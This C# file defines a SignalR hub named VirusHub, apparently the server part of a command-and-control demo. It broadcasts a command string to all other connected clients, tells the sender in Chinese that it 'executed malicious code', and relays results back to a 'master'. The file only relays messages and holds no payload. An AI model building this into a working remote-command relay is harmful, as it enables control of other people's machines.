using Microsoft.AspNetCore.SignalR;

namespace VirusSignalR.Server.Hubs
{
    public class VirusHub : Hub
    {
        public void SendCommandToAll(string command)
        {

            Clients.Caller.SendAsync("ReceiveMessage"
                , "你执行了恶意代码：" + command);

            Clients.Others.SendAsync("ReceiveCommand"
                , command);
        }

        public void SendInvokeResultToMaster(string result)
        {
            Clients.Others.SendAsync("ReceiveMessage"
                , result);
        }
    }
}
